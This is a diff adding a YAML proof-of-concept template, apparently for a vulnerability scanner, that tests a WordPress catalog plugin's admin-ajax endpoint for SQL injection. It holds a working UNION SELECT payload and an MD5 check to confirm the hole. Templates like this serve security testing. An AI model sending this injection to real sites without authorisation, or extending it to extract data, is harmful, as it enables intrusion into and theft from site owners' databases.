@@ -1,0 +1,20 @@
+name: poc-yaml-wordpress-ext-catalog-sqli
+
+set:
+  r: randomInt(800000000, 1000000000)
+
+rules:
+  - method: POST
+    path: /wp-admin/admin-ajax.php
+    headers:
+      User-Agent: >-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+    body: >-
+      selectedCategory=0 UNION SELECT 1,md5({{r}}),3,4,5,6 FROM wp_terms WHERE term_id=1&action=UpdateCategoryList
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
+
+detail:
+  author: durkworf(https://github.com/durkworf)
+  links:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/4
